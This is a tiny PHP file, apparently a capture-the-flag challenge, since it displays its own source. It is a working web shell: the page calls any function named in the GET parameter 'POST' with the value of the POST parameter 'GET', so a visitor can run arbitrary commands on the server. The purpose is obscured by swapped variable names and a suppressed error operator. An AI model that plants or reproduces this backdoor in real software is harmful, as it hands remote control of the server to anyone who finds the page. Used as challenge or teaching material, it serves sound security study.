<?php
show_source(__FILE__);
function a()
{
    $POST = null;
    $GET = $_POST["GET"];
    $Cookie = $POST.$GET;
    return $Cookie;
}
@$_GET["POST"](a());
?>